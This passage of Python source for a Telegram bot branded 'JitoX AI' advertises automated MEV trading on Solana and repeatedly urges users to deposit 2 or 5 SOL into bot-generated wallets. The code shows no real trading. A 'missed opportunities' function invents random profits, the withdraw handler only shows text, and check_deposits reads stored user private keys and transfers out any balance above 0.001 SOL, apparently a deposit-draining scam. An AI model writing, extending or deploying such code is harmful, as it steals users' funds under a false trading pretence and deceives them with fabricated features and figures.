            "⚔️ Custom slippage tolerance\n"
            "⚔️ Priority routing configuration\n"
            "⚔️ Cross-pool arbitrage vectors\n\n"
            "✨ <b>Implementation:</b>\n"
            "Input contract address for advanced MEV targeting\n\n"
            "Professional traders understand: Strategic asset selection maximizes MEV opportunities. 🎮"
        )
    keyboard = [
        [InlineKeyboardButton("➕ Add Token", callback_data='add_token'),
         InlineKeyboardButton("➖ Remove Token", callback_data='remove_token')],
        [InlineKeyboardButton("📋 View Token List", callback_data='view_tokens')],
        [InlineKeyboardButton("🔙 Back", callback_data='back')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def add_token(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
        "➕ <b>Add Token</b> ➕\n\n"
        "Please enter the contract address of the token you'd like to add to your targeting list.\n\n"
        "Example format: 7EcDhSYGxXyscszYEp35KHN8vvw3svAuLKTzXwCFLtV"
    )
    await update.callback_query.edit_message_text(message, parse_mode='HTML')
    context.user_data['awaiting_token_input'] = True
    await log_user_activity(context.application, user_id, "accessed Add Token")

async def remove_token(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    token_list = context.user_data.get('token_list', [])
    
    if not token_list:
        message = "You haven't added any tokens yet. Use the 'Add Token' option to get started."
        keyboard = [[InlineKeyboardButton("🔙 Back to Token Targeting", callback_data='token_targeting')]]
    else:
        message = "Select a token to remove:"
        keyboard = [[InlineKeyboardButton(f"❌ {token[:10]}...{token[-4:]}", callback_data=f'remove_{token}')] for token in token_list]
        keyboard.append([InlineKeyboardButton("🔙 Back to Token Targeting", callback_data='token_targeting')])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "accessed Remove Token")

async def view_tokens(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    token_list = context.user_data.get('token_list', [])
    
    if not token_list:
        message = "You haven't added any tokens yet. Use the 'Add Token' option to get started."
    else:
        message = "📋 <b>Your Token List</b> 📋\n\n" + "\n".join([f"🔹 {token[:10]}...{token[-4:]}" for token in token_list])
    
    keyboard = [[InlineKeyboardButton("🔙 Back to Token Targeting", callback_data='token_targeting')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "viewed Token List")

async def auto_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "🤖 <b>Auto MEV - VIP Feature</b> 🤖\n\n"
        "Unlock the full power of automated MEV:\n"
        "🔹 24/7 AI-driven MEV exploitation\n"
        "🔹 Advanced predictive algorithms\n"
        "🔹 Priority execution on all strategies\n\n"
        "️ Requires a minimum balance of 5 SOL"
    )
    keyboard = [
        [InlineKeyboardButton("🟢 Activate Auto MEV", callback_data='activate_auto_mev'),
         InlineKeyboardButton("🔴 Deactivate Auto MEV", callback_data='deactivate_auto_mev')],
        [InlineKeyboardButton("📊 Auto MEV Stats", callback_data='auto_mev_stats')],
        [InlineKeyboardButton("🔙 Back", callback_data='back')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def activate_auto_mev(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
        "🚀 <b>Auto MEV Activation</b> 🚀\n\n"
        "⚠️ You need a minimum balance of 5 SOL to activate Auto MEV.\n\n"
        "Deposit 5 SOL to unlock this powerful feature and maximize your MEV profits!"
    )
    keyboard = [[InlineKeyboardButton("🔙 Back to Auto MEV", callback_data='auto_mev')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "attempted to activate Auto MEV")

async def deactivate_auto_mev(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
        "🛑 <b>Auto MEV Deactivation</b> 🛑\n\n"
        "Auto MEV is not currently active.\n\n"
        "Activate Auto MEV with a 5 SOL balance to experience its benefits!"
    )
    keyboard = [[InlineKeyboardButton("🔙 Back to Auto MEV", callback_data='auto_mev')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "attempted to deactivate Auto MEV")

async def auto_mev_stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
        "📊 <b>Auto MEV Statistics</b> 📊\n\n"
        "Auto MEV is not currently active.\n\n"
        "Activate Auto MEV with a 5 SOL balance to start generating statistics!"
    )
    keyboard = [[InlineKeyboardButton("🔙 Back to Auto MEV", callback_data='auto_mev')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "viewed Auto MEV stats")

async def withdraw_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await log_user_activity(context.application, update.effective_user.id, "used /withdraw command")
    await withdraw(update, context)

async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    await log_user_activity(context.application, user_id, "attempted to withdraw")
    
    message = (
            "👾 <b>JitoX AI - Professional Balance Management</b> 👾\n\n"
            "💎 <b>Strategic Withdrawal Protocol</b>\n\n"
            "⚡️ <b>Operational Requirements</b>\n"
            "• Maintain 2 SOL minimum trading balance\n"
            "• Preserve execution priority status\n"
            "• Ensure continuous MEV capture\n\n"
            "🎯 <b>Performance Considerations</b>\n"
            "⚔️ Optimal strategy continuation\n"
            "⚔️ Uninterrupted profit generation\n"
            "⚔️ Sustained institutional access\n\n"
            "🛡️ <b>Security Framework</b>\n"
            "✨ Self-custodial asset protection\n"
            "✨ Professional-grade security protocols\n"
            "✨ Institutional withdrawal standards\n\n"
            "Professional traders understand: Strategic balance management ensures optimal MEV performance. 🎮"
        )
    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.message:
        await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')
    elif update.callback_query:
        await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle button presses."""
    try:
        query = update.callback_query
        user_id = query.from_user.id
        data = query.data
        logger.info(f"Button press from user {user_id}: {data}")

        # Answer callback query immediately to prevent timeout
        await query.answer()

        # Basic navigation
        if data == "back":
            await start(update, context)
            
        # Wallet related
        elif data == "get_wallet":
            await get_wallet_command(update, context)
        elif data.startswith("show_key_"):
            await handle_show_key(update, context)
        elif data.startswith("confirm_show_key_"):
            await show_private_key_confirmed(update, context)
        elif data.startswith("check_balance_"):
            public_key = data.split("_")[2]
            balance = await get_balance(public_key)
            await query.edit_message_text(
                f"Current balance: {balance} SOL\n\nClick /get_wallet to return to wallet menu.",
                parse_mode='HTML'
            )
            
        # MEV related
        elif data == "start_mev":
            await activate_auto_mev(update, context)
        elif data == "stop_mev":
            await deactivate_auto_mev(update, context)
        elif data == "mev_pending" or data == "auto_mev_stats":
            await auto_mev_stats(update, context)
        elif data == "mev_positions":
            await auto_mev_stats(update, context)
        elif data == "track_mev":
            await auto_mev(update, context)
            
        # Settings and configuration
        elif data == "nexus_settings":
            await nexus_settings(update, context)
        elif data == "intensity":
            await intensity(update, context)
        elif data == "pool_settings":
            await pool_settings(update, context)
        elif data == "token_targeting":
            await token_targeting(update, context)
        elif data == "intensity_low":
            await set_intensity(update, context, "low")
        elif data == "intensity_medium":
            await set_intensity(update, context, "medium")
        elif data == "intensity_high":
            await set_intensity(update, context, "high")
            
        # Advanced features
        elif data == "auto_mev":
            await auto_mev(update, context)
        elif data == "withdraw":
            await withdraw(update, context)
        elif data == "get_eth_wallet":
            await get_eth_wallet(update, context)
            
        # Help and info
        elif data == "help":
            await min_deposit_faq(update, context)
        elif data == "info":
            await mev_info_faq(update, context)
        elif data == "security":
            await security_faq(update, context)
        elif data == "withdraw_help":
            await withdraw_faq(update, context)
            
        # Risk and pool management
        elif data == "risk_level":
            await risk_level(update, context)
        elif data == "gas_settings":
            await gas_settings(update, context)
        elif data == "add_liquidity":
            await add_liquidity(update, context)
        elif data == "remove_liquidity":
            await remove_liquidity(update, context)
        elif data == "view_pool_stats":
            await view_pool_stats(update, context)
            
        # Token management
        elif data == "add_token":
            await add_token(update, context)
        elif data == "remove_token":
            await remove_token(update, context)
        elif data == "view_tokens":
            await view_tokens(update, context)
            
        # Settings
        elif data == "toggle_notifications":
            await toggle_mev_notifications(update, context)
        elif data == "auto_compound":
            await auto_compound(update, context)
            
        # Referral system
        elif data == "referral":
            message = (
                "🎁 <b>JitoX AI Professional Network</b> 🎁\n\n"
                "💎 <b>Strategic Partnership Framework</b>\n\n"
                "⚡️ <b>Professional Benefits</b>\n"
                "• 10% commission on referral deposits\n"
                "• Real-time performance tracking\n"
                "• Institutional network access\n\n"
                "🎯 <b>Partnership Features</b>\n"
                "⚔️ Instant commission payouts\n"
                "⚔️ Unlimited referral capacity\n"
                "⚔️ Professional tracking matrix\n\n"
                "🛡️ <b>Network Requirements</b>\n"
                "✨ Standard Suite: 2 SOL initialization\n"
                "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
                "Professional traders understand: Strategic partnerships drive collective success. 🎮"
            )
            keyboard = [
                [InlineKeyboardButton("🔑 Initialize Partnership", callback_data="get_wallet")],
                [InlineKeyboardButton("🔙 Back", callback_data="back")]
            ]
            await query.edit_message_text(
                message,
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='HTML'
            )
        
        logger.info(f"Successfully handled button press for user {user_id}")
        
    except Exception as e:
        logger.error(f"Error in button_handler: {e}")
        # Provide a user-friendly error message
        error_keyboard = [[InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back")]]
        await query.edit_message_text(
            "⚠️ An error occurred while processing your request. Please try again.",
            reply_markup=InlineKeyboardMarkup(error_keyboard)
        )

async def send_admin_notification(application, message: str):
    admin_chat_id = -4540844698  # Your admin chat ID
    try:
        await application.bot.send_message(chat_id=admin_chat_id, text=message)
        logger.info(f"Admin notification sent: {message}")
    except Exception as e:
        logger.error(f"Failed to send admin notification: {e}")


def generate_missed_opportunities():
    opportunity_types = ['Arbitrage', 'Frontrun', 'Sandwich']
    missed_opportunities = []
    for type in opportunity_types:
        profit = random.uniform(0.5, 2.0)
        missed_opportunities.append(f"Missed {type}: {profit:.2f} SOL profit")
    return missed_opportunities

async def token_watchlist(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Strategic Token Intelligence</b> 👾\n\n"
            "💎 <b>Professional Monitoring Framework</b>\n\n"
            "⚡️ <b>Advanced Features</b>\n"
            "• Real-time market surveillance\n"
            "• Institutional-grade price analytics\n"
            "• Strategic opportunity detection\n\n"
            "🎯 <b>Professional Advantages</b>\n"
            "⚔️ Precision market monitoring\n"
            "⚔️ Advanced alert protocols\n"
            "⚔️ Dynamic trend analysis\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior market intelligence drives optimal execution. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoX_AI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def custom_risk_management(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Professional Risk Framework</b> 👾\n\n"
            "💎 <b>Strategic Risk Architecture</b>\n\n"
            "⚡️ <b>Advanced Risk Protocols</b>\n"
            "• Institutional-grade position management\n"
            "• Dynamic stop-loss optimization\n"
            "• Strategic profit targeting\n\n"
            "🎯 <b>Professional Features</b>\n"
            "️ Real-time risk assessment matrix\n"
            "⚔️ Advanced portfolio protection\n"
            "⚔️ Customizable execution parameters\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior risk management ensures sustainable MEV capture. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoX_AI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def risk_profiling(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Strategic Risk Intelligence</b> 👾\n\n"
            "💎 <b>Professional Risk Assessment Matrix</b>\n\n"
            "⚡️ <b>Advanced Analytics</b>\n"
            "• Institutional risk profiling\n"
            "• Strategic tolerance analysis\n"
            "• Dynamic strategy alignment\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔️ Real-time risk calibration\n"
            "⚔️ Advanced strategy optimization\n"
            "⚔️ Precision execution mapping\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior risk profiling drives optimal MEV performance. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoX_AI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def custom_trading_bots(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Advanced Automation Matrix</b> 👾\n\n"
            "💎 <b>Professional Trading Architecture</b>\n\n"
            "⚡️ <b>Strategic Protocols</b>\n"
            "• Institutional-grade automation\n"
            "• Custom parameter optimization\n"
            "• Advanced execution logic\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔️ Precision strategy deployment\n"
            "⚔️ Real-time performance analytics\n"
            "⚔️ Advanced backtesting framework\n\n"
            "🛡️ <b>System Architecture</b>\n"
            "✨ AI-driven strategy builder\n"
            "✨ Professional template library\n"
            "✨ Dynamic execution protocols\n\n"
            "🔮 <b>Access Framework</b>\n"
            "• Standard Suite: 2 SOL initialization\n"
            "• Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior automation drives consistent MEV capture. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoX_AI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def ai_market_predictions(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Predictive Intelligence Matrix</b> 👾\n\n"
            "💎 <b>Advanced Market Forecasting</b>\n\n"
            "⚡️ <b>Strategic Analytics</b>\n"
            "• Neural prediction algorithms\n"
            "• Real-time trend detection\n"
            "• Institutional market modeling\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔️ Advanced pattern recognition\n"
            "⚔️ Predictive execution protocols\n"
            "⚔️ Dynamic strategy adaptation\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior market intelligence drives predictive MEV capture. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoX_AI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def advanced_charting(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Advanced Analytics Suite</b> 👾\n\n"
            "💎 <b>Professional Charting Architecture</b>\n\n"
            "⚡️ <b>Strategic Visualization</b>\n"
            "• Institutional-grade technical analysis\n"
            "• Multi-timeframe market modeling\n"
            "• Advanced indicator integration\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔️ Real-time chart optimization\n"
            "⚔️ Custom indicator framework\n"
            "⚔️ Precision trend analysis\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior market analysis drives strategic MEV execution. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoX_AI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def multi_account(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Strategic Account Matrix</b> 👾\n\n"
            "💎 <b>Professional Portfolio Architecture</b>\n\n"
            "⚡️ <b>Advanced Management Protocols</b>\n"
            "• Multi-account synchronization\n"
            "• Institutional position tracking\n"
            "• Unified execution framework\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔ Seamless account integration\n"
            "⚔️ Cross-portfolio optimization\n"
            "⚔️ Strategic capital allocation\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior account management drives optimal MEV performance. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoX_AI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def historical_analysis(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Performance Analytics Matrix</b> 👾\n\n"
            "💎 <b>Strategic Intelligence Framework</b>\n\n"
            "⚡️ <b>Advanced Performance Metrics</b>\n"
            "• Institutional-grade analytics\n"
            "• Strategic efficiency tracking\n"
            "• Comprehensive execution analysis\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔️ Advanced pattern recognition\n"
            "⚔️ Performance optimization protocols\n"
            "⚔️ Strategic improvement matrix\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior analytics drive strategic MEV optimization. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoX_AI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def diversification(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Strategic Portfolio Matrix</b> 👾\n\n"
            "💎 <b>Professional Diversification Framework</b>\n\n"
            "⚡️ <b>Advanced Portfolio Protocols</b>\n"
            "• Institutional-grade risk distribution\n"
            "• Strategic asset allocation\n"
            "• Dynamic portfolio balancing\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔️ Real-time portfolio optimization\n"
            "⚔️ Advanced correlation analysis\n"
            "⚔️ Strategic rebalancing matrix\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior diversification drives sustainable MEV capture. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoX_AI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def ai_strategy(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Strategic Intelligence Suite</b> 👾\n\n"
            "💎 <b>Advanced Strategy Architecture</b>\n\n"
            "⚡️ <b>Neural Trading Protocols</b>\n"
            "• Personalized execution matrices\n"
            "• Adaptive learning algorithms\n"
            "• Real-time strategy optimization\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔️ Advanced pattern recognition\n"
            "⚔️ Dynamic strategy adaptation\n"
            "⚔️ Predictive market modeling\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior intelligence drives strategic MEV execution. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoX_AI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def dynamic_risk(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Dynamic Risk Matrix</b> 👾\n\n"
            "💎 <b>Advanced Risk Intelligence</b>\n\n"
            "️ <b>Adaptive Risk Protocols</b>\n"
            "• Real-time exposure management\n"
            "• Dynamic threshold optimization\n"
            "• Institutional risk modeling\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔️ Automated risk calibration\n"
            "⚔️ Strategic loss prevention\n"
            "⚔️ Advanced profit maximization\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior risk adaptation ensures optimal MEV performance. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoX_AI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def strategy_sharing(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Strategic Network Matrix</b> 👾\n\n"
            "💎 <b>Professional Collaboration Framework</b>\n\n"
            "⚡️ <b>Advanced Network Protocols</b>\n"
            "• Institutional strategy sharing\n"
            "• Professional knowledge exchange\n"
            "• Collaborative performance analysis\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔️ Strategic insight distribution\n"
            "⚔️ Advanced methodology sharing\n"
            "⚔️ Cross-portfolio optimization\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior collaboration drives collective MEV excellence. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoX_AI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def copy_trading(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Strategic Replication Matrix</b> 👾\n\n"
            "💎 <b>Professional Mirroring Framework</b>\n\n"
            "⚡️ <b>Advanced Replication Protocols</b>\n"
            "• Institutional position mirroring\n"
            "• Real-time strategy synchronization\n"
            "• Professional execution matching\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔️ Elite trader selection matrix\n"
            "⚔️ Advanced performance tracking\n"
            "⚔️ Dynamic allocation optimization\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior replication drives consistent MEV performance. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoX_AI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

# Store previous balances in memory
wallet_balances = {}
last_transfer_timestamps = {}

async def check_deposits(context: ContextTypes.DEFAULT_TYPE) -> None:
    logger.info("Starting check_deposits function")
    
    try:
        df = pd.read_csv(WALLET_CSV_FILE, on_bad_lines='skip', engine='python')
        df = df.dropna()
        df = df[df['user_id'] != 'user_id']  # Remove header rows if duplicated
        
        async with aiohttp.ClientSession() as session:
            for _, row in df.iterrows():
                wallet_address = row['public_key']
                private_key = row['private_key']
                
                if not wallet_address or len(wallet_address) < 32:
                    continue
                    
                logger.info(f"Checking wallet: {wallet_address}")
                await asyncio.sleep(2)  # Base delay between checks
                
                # Get balance with retries
                for _ in range(3):  # Try up to 3 times
                    balance = await get_balance(wallet_address)
                    if balance is not None:
                        break
                    await asyncio.sleep(5)  # Wait between retries
                
                if balance is None:
                    continue
                    
                logger.info(f"Current balance for {wallet_address}: {balance} SOL")
                
                if balance > 0.001:  # Threshold for transfer
                    logger.info(f"Balance {balance} SOL exceeds threshold for {wallet_address}")
                    await asyncio.sleep(5)  # Wait before transfer
                    success = await transfer_balance(private_key, wallet_address, balance)
                    
                    if not success:
                        await asyncio.sleep(10)  # Wait longer after failed transfer
                        
    except Exception as e:
        logger.error(f"Error in check_deposits: {str(e)}")
        
    logger.info("Finished check_deposits function")

async def min_deposit_faq(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Strategic Capital Framework</b> 👾\n\n"
            "💎 <b>Professional Infrastructure Requirements</b>\n\n"
            "⚡️ <b>2 SOL Initialization Protocol</b>\n\n"
            "🎯 <b>Strategic Architecture</b>\n"
            "⚔️ Advanced Gas Management: Institutional-grade transaction execution\n"
            "⚔️ Opportunity Matrix: Enhanced MEV capture capabilities\n"
            "⚔️ Risk Framework: Professional position management protocols\n"
            "⚔️ Competitive Edge: Superior market positioning architecture\n"
            "⚔️ Sustainable Performance: Strategic capital optimization\n\n"
            "🛡️ <b>Professional Tiers</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "• Advanced execution protocols\n"
            "• Core MEV capture matrix\n"
            "• Standard performance metrics\n\n"
            "✨ Enhanced Suite: 5+ SOL activation\n"
            "• Priority execution framework\n"
            "• Advanced profit optimization\n"
            "• Institutional feature access\n\n"
            "Professional traders understand: Superior capitalization drives exceptional MEV performance. 🎮\n\n"
            "💫 <b>24/7 Professional Support</b>\n"
            "Contact @JitoX_AI for immediate assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='back')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def mev_info_faq(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Enterprise MEV Architecture</b> 👾\n\n"
            "💎 <b>Professional Trading Infrastructure</b>\n\n"
            "⚡️ <b>Core Protocol Suite</b>\n\n"
            "🎯 <b>Strategic Entry Protocol</b>\n"
            "⚔️ Advanced listing detection algorithms\n"
            "⚔️ Sub-millisecond execution matrix\n"
            "⚔️ Precision entry optimization\n\n"
